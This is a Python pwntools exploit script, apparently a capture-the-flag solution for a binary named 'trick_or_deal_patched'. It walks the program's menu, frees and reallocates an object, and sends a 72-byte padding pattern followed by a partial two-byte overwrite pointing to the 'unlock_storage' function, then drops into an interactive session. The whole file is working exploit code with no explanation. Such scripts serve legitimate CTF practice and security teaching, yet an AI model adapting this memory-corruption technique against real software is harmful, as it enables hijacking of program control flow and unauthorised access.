#!/usr/bin/env python3

from pwn import *

elf = ELF("./trick_or_deal_patched")

context.binary = elf

r = process()

r.sendlineafter(b'What do you want to do? ',b'4')
r.sendlineafter(b'What do you want to do? ',b'3')
r.sendlineafter(b'offer(y/n): ',b'y')
r.sendlineafter(b'want your offer to be? ',str(0x50).encode())
r.sendafter(b'What can you offer me? ',cyclic(72)+p16(elf.sym.unlock_storage & 0xffff))
r.sendlineafter(b'What do you want to do? ',b'1')
r.interactive()

